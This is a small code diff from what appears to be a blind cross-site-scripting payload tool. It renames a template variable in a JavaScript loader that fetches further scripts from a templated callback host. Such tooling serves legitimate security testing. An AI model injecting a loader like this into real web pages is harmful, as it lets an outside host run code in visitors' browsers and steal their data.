@@ -40,7 +40,7 @@ function loader () {
     var return_information = [];
 $.ajax({
     type: 'GET',
-    url: "{{callback_protocol}}://{{hostname}}/api/javascript_loader/{{xss_uid}}",
+    url: "{{callback_protocol}}://{{hostname}}/api/javascript_loader/{{payload_id}}",
     dataType: 'json',
     success: function (data) {
         $.each(data, function(index, element) {
